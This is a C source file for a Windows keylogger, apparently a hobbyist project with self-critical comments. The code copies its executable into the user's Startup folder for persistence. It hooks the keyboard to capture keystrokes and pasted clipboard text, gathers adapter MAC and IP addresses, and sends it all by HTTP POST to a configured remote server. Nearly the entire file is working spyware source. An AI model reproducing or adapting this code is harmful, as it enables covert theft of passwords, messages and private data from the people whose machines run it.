// Compile: clang Winapp.c -o static/win.exe -liphlpapi -lws2_32 -lgdi32 -lUser32 -lwinhttp -lShell32
// clang Winapp.c -o win.exe -liphlpapi -lws2_32 -lgdi32 -lUser32 -lwinhttp -lShell32
#pragma warning(disable : 4996)

#include "Winapp.h"

#include <Windows.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <stdbool.h>
#include <stdio.h>
#include <winsock2.h>
#include <winuser.h>
#include <ws2tcpip.h>

int main()
{
  CopyExecutableToStartup();
  // Initialize Winsock
  WSADATA wsaData;
  if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
  {
    printf("Failed to initialize Winsock.\n");
    return 1;
  }

  // Set up the keyboard hook
  HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

  // This code continuously retrieves and processes messages from the message queue in a Windows GUI application... dont really understand how though
  MSG msg;
  while (GetMessage(&msg, NULL, 0, 0))
  {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  // Check if the keyboard hook setup is successful
  if (!keyboardHook)
  {
    printf("Failed to set up the keyboard hook.\n");
    return 1;
  }

  printf("Keylogger started. Press Ctrl+Q to exit...\n");
  // Unhook the keyboard hook
  UnhookWindowsHookEx(keyboardHook);
  printf("Exiting the program.\n");
  return 0;
}

int CopyExecutableToStartup()
{
  char currentPath[MAX_PATH];
  char destinationPath[MAX_PATH];

  if (GetModuleFileName(NULL, currentPath, MAX_PATH) == 0)
  {
    printf("Failed to get the current executable path\n");
    return 1;
  }

  char userProfilePath[MAX_PATH];
  if (SUCCEEDED(
          SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfilePath)))
  {
    snprintf(destinationPath, MAX_PATH,
             "%s\\AppData\\Roaming\\Microsoft\\Windows\\Start "
             "Menu\\Programs\\Startup\\win.exe",
             userProfilePath);

    if (CopyFileA(currentPath, destinationPath, FALSE) == 0)
    {
      DWORD errorCode = GetLastError();
      LPVOID errorMessage;
      FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
                    NULL, errorCode,
                    0, // Default language
                    (LPSTR)&errorMessage, 0, NULL);

      if (errorMessage != NULL)
      {
        printf("Failed to copy the executable to the Startup folder (Error "
               "Code: %lu)\n",
               errorCode);
        LocalFree(errorMessage);
      }
      else
      {
        printf("Failed to copy the executable to the Startup folder (Error "
               "Code: %lu)\n",
               errorCode);
      }
      return 1;
    }
    else
    {
      printf("Copy of the executable created in the Startup folder\n");
      return 0;
    }
  }
  return 1;
}

// Define a global KeyloggerData structure
void InitializeKeyloggerData(struct KeyloggerData *data)
{
  data->exitRequested = false;
  data->clientSocket = INVALID_SOCKET;
  data->keylogBuffer[0] = '\0';
  data->adapterInfoBuffer[0] = '\0';
  data->clipboardBuffer[0] = '\0';
  data->combinedData[0] = '\0';
}

// Function to retrieve MAC addresses and IPs
char *GetMACAddressesAndIPs(struct KeyloggerData *data)
{
  // Initialize variables for retrieving adapter addresses Might want to set up
  // a static amount so I am not dynamically allocating on the heap
  ULONG outBufLen = 0;
  DWORD result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL,
                                      NULL, &outBufLen);
  // printf("Result: %lu\n", result);
  //  Check if buffer overflow occurred
  if (result == ERROR_BUFFER_OVERFLOW)
  {
    // Allocate memory for adapter addresses
    IP_ADAPTER_ADDRESSES *pAdapterAddresses =
        (IP_ADAPTER_ADDRESSES *)malloc(outBufLen);
    // dont think this is needed. and might be bad?
    memset(pAdapterAddresses, 0, outBufLen);
    if (pAdapterAddresses)
    {
      // Retrieve adapter addresses
      result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL,
                                    pAdapterAddresses, &outBufLen);
      if (result == NO_ERROR)
      {
        // Traverse through adapter addresses
        IP_ADAPTER_ADDRESSES *pAdapter = pAdapterAddresses;
        while (pAdapter)
        {
          char adapterInfo[1028];
          char ipAddress[16];

          // Loop through unicast addresses to find IPv4 address
          for (PIP_ADAPTER_UNICAST_ADDRESS pUnicast =
                   pAdapter->FirstUnicastAddress;
               pUnicast; pUnicast = pUnicast->Next)
          {
            if (pUnicast->Address.lpSockaddr->sa_family == AF_INET)
            {
              struct sockaddr_in *sockAddrIn =
                  (struct sockaddr_in *)pUnicast->Address.lpSockaddr;
              inet_ntop(AF_INET, &(sockAddrIn->sin_addr), ipAddress,
                        sizeof(ipAddress));

              break; // Found IPv4 address, exit loop
            }
          }
          // Format adapter info
          snprintf(adapterInfo, sizeof(adapterInfo),
                   "Adapter Name: %s\n"
                   "MAC Address: %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n"
                   "IP Address: %s\n\n",
                   pAdapter->AdapterName, pAdapter->PhysicalAddress[0],
                   pAdapter->PhysicalAddress[1], pAdapter->PhysicalAddress[2],
                   pAdapter->PhysicalAddress[3], pAdapter->PhysicalAddress[4],
                   pAdapter->PhysicalAddress[5], ipAddress);

          // Append adapter info to the main buffer
          strcat(data->adapterInfoBuffer, adapterInfo);
          pAdapter = pAdapter->Next;
        }

        free(pAdapterAddresses); // Free memory allocated for
                                 // IP_ADAPTER_ADDRESSES

        return data->adapterInfoBuffer;
      }
      else
      {
        printf("GetAdaptersAddresses failed with error: %lu\n", result);
      }

      free(pAdapterAddresses);
    }
    else
    {
      printf("Failed to allocate memory for adapter addresses.\n");
    }
  }
  else
  {
    printf("GetAdaptersAddresses failed with error: %lu\n", result);
  }
  return NULL; // Return NULL in case of error
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
  static struct KeyloggerData data;
  static bool initialized = false;

  // sends the adapter info if first time connected
  if (!initialized)
  {
    InitializeKeyloggerData(&data);
    GetMACAddressesAndIPs(&data);
    snprintf(data.combinedData, sizeof(data.combinedData), "%s%s%s",
             data.adapterInfoBuffer, data.keylogBuffer, data.clipboardBuffer);
    SendDataToServer(&data);
    initialized = true;
    memset(data.adapterInfoBuffer, 0, sizeof(data.adapterInfoBuffer));
  }

  // Check if a key is pressed
  if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
  {
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

    // Check if Shift and Control keys are pressed
    bool shift = GetKeyState(VK_SHIFT) & 0x8000;
    bool ctrl = GetKeyState(VK_CONTROL) & 0x8000;
    HANDLE clipboardData = GetClipboardData(CF_TEXT);
    char *clipboardText = (char *)GlobalLock(clipboardData);

    // Get the corresponding character(s) based on the key press
    BYTE keyboardState[256] = {0};
    if (shift)
      keyboardState[VK_SHIFT] = 0x80;

    // LPWSTR LPbuffer = {0};
    char *buffer[255] = {0};
    int length = ToUnicode(p->vkCode, p->scanCode, keyboardState, buffer, 4, 0);

    // char buffer[255] = {0};

    // WideCharToMultiByte(CP_UTF8, 0, LPbuffer, -1, buffer, 255, NULL, NULL);

    // Append the character(s) to the keylog buffer
    strncat(data.keylogBuffer, buffer, length);

    if (p->vkCode == VK_RETURN)
    {

      // Combine the data for printing
      snprintf(data.combinedData, sizeof(data.combinedData), "%s",
               data.keylogBuffer);

      // Send the data to the server only if it hasn't been sent before
      SendDataToServer(&data);

      // Clear the keylog buffer (set to 0)
      memset(data.keylogBuffer, 0, sizeof(data.keylogBuffer));
    }

    // handle copy-pasted text
    else if (p->vkCode == 'V' && GetAsyncKeyState(VK_CONTROL) < 0)
    {
      if (OpenClipboard(NULL))
      {
        HANDLE clipboardData = GetClipboardData(CF_TEXT);
        if (clipboardData)
        {
          char *clipboardText = (char *)GlobalLock(clipboardData);

          // Append clipboard text to the clipboard buffer
          strncat(data.clipboardBuffer, "{",
                  sizeof(data.clipboardBuffer) - strlen(data.clipboardBuffer) - 1);
          strncat(data.clipboardBuffer, clipboardText,
                  sizeof(data.clipboardBuffer) - strlen(data.clipboardBuffer) - 1);
          strncat(data.clipboardBuffer, "}",
                  sizeof(data.clipboardBuffer) - strlen(data.clipboardBuffer) - 1);

          snprintf(data.combinedData, sizeof(data.combinedData), "%s",
                   data.clipboardBuffer);

          GlobalUnlock(clipboardData);
          CloseClipboard();

          printf("\n\nclipboardBuffer: %s", data.clipboardBuffer);

          // Send clipboard data to the server
          SendDataToServer(&data);

          // Clear the clipboard buffer (set it to 0)
          memset(data.clipboardBuffer, 0, sizeof(data.clipboardBuffer));
        }
      }
    }
    // Check if Ctrl+Q is pressed to close program
    else if (p->vkCode == 'Q' && GetAsyncKeyState(VK_CONTROL) < 0)
    {
      printf("Ctrl-Q was pressed");
      data.exitRequested = true;

      memset(data.keylogBuffer, 0, sizeof(data.keylogBuffer));
      memset(data.clipboardBuffer, 0, sizeof(data.clipboardBuffer));

      PostQuitMessage(0);
    }
  }

  // Call the next hook in the chain
  return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void SendDataToServer(struct KeyloggerData *data)
{
  // Initialize Winsock
  printf("\nsocket status: %llu", data->clientSocket);
  WSADATA wsaData;
  if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
  {
    printf("Failed to initialize Winsock.\n");
    return;
  }

  // Create a socket I suppose I could have used a default socket instead of
  // storing it in my struct
  data->clientSocket = socket(AF_INET, SOCK_STREAM, 0);
  if (data->clientSocket == INVALID_SOCKET)
  {
    printf("Failed to create socket.\n");
    WSACleanup();
    return;
  }

  // Specify server address and port
  struct sockaddr_in serverAddr;
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_port = htons(SERVER_PORT);
  serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

  // I think I am connecting to server everytime I pass something, I should
  // really remain connected until final closure. Connect to the server
  if (connect(data->clientSocket, (struct sockaddr *)&serverAddr,
              sizeof(serverAddr)) == SOCKET_ERROR)
  {
    printf("Failed to connect to the server.\n");
    closesocket(data->clientSocket);
    WSACleanup();
    data->clientSocket = INVALID_SOCKET; // Update the socket status
    return;
  }

  int contentLength = strlen(data->combinedData);

  // Prepare the HTTP POST request
  char httpRequest[16384];
  sprintf(httpRequest,
          "POST /upload HTTP/1.1\r\n"
          "Host: %s\r\n"
          "Content-Length: %d\r\n"
          "Content-Type: text/plain\r\n\r\n",
          SERVER_IP, contentLength);

  printf("\nData Sent to Server ------->: %s", data->combinedData);

  // Send the HTTP POST request header
  int headerBytesSent = send(data->clientSocket, httpRequest, strlen(httpRequest), 0);
  if (headerBytesSent != strlen(httpRequest))
  {
    printf("Failed to send HTTP header to server.\n");
    closesocket(data->clientSocket);
    WSACleanup();
    return;
  }

  // Send all data
  int dataBytesSent = send(data->clientSocket, data->combinedData, contentLength, 0);
  if (dataBytesSent != contentLength)
  {
    printf("Failed to send data to server.\n");
    closesocket(data->clientSocket);
    WSACleanup();
    return;
  }
}